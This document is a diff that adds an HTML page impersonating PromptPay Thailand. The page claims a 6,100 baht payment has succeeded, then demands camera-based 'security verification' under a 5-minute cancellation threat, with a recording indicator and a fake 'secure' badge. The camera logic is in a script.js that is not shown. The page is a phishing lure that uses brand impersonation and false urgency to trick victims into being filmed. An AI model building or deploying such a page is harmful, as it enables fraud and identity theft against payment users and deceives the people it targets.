@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>การยืนยันการชำระเงิน QR - PromptPay Thailand</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🇹🇭</text></svg>">
+</head>
+<body>
+    <div class="container">
+        <header class="header">
+            <div class="logo">
+                <img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23007bff'><path d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z'/></svg>" alt="PromptPay" class="logo-img">
+                <span class="logo-text">PromptPay Thailand</span>
+            </div>
+            <div class="status-indicator">
+                <span class="status-dot"></span>
+                <span>ปลอดภัย</span>
+            </div>
+        </header>
+
+        <main class="main-content">
+            <div class="payment-card">
+                <div class="payment-header">
+                    <h1>🎉 การชำระเงินสำเร็จ!</h1>
+                    <p class="success-message">Payment Successful</p>
+                </div>
+
+                <div class="payment-details">
+                    <div class="amount">
+                        <span class="currency">฿</span>
+                        <span class="value">6,100.00</span>
+                    </div>
+                    
+                    <div class="transaction-info">
+                        <div class="info-row">
+                            <span class="label">ผู้รับเงิน (Recipient):</span>
+                            <span class="value">Bangkok Digital Store</span>
+                        </div>
+                        <div class="info-row">
+                            <span class="label">รหัสอ้างอิง (Ref):</span>
+                            <span class="value">TH240124789456</span>
+                        </div>
+                        <div class="info-row">
+                            <span class="label">เวลา (Time):</span>
+                            <span class="value" id="transaction-time"></span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="security-section">
+                    <div class="security-icon">🔐</div>
+                    <h2>การยืนยันความปลอดภัย</h2>
+                    <h3>Security Verification Required</h3>
+                    <p>เพื่อความปลอดภัยของการทำรายการ กรุณายืนยันตัวตนผ่านกล้อง</p>
+                    <p class="english-text">For security purposes, please verify your identity using camera verification</p>
+                    
+                    <div class="camera-section" id="cameraSection">
+                        <video id="video" autoplay muted playsinline></video>
+                        <canvas id="canvas" style="display: none;"></canvas>
+                        
+                        <div class="camera-controls">
+                            <button id="startCamera" class="btn-primary">
+                                📹 เริ่มการยืนยัน / Start Verification
+                            </button>
+                            <div id="recording-status" class="recording-status" style="display: none;">
+                                <div class="recording-dot"></div>
+                                <span>กำลังบันทึก... Recording...</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="warning-box">
+                        <div class="warning-icon">⚠️</div>
+                        <p><strong>สำคัญ:</strong> หากไม่ยืนยันตัวตน การทำรายการอาจถูกยกเลิกภายใน 5 นาที</p>
+                        <p><strong>Important:</strong> If identity verification is not completed, transaction may be cancelled within 5 minutes</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="footer-links">
+                <a href="#">ติดต่อเรา / Contact Us</a>
+                <a href="#">ช่วยเหลือ / Help</a>
+                <a href="#">ความปลอดภัย / Security</a>
+            </div>
+        </main>
+    </div>
+
+    <div id="loadingOverlay" class="loading-overlay" style="display: none;">
+        <div class="loading-content">
+            <div class="spinner"></div>
+            <p>กำลังประมวลผล...</p>
+            <p>Processing verification...</p>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html> 
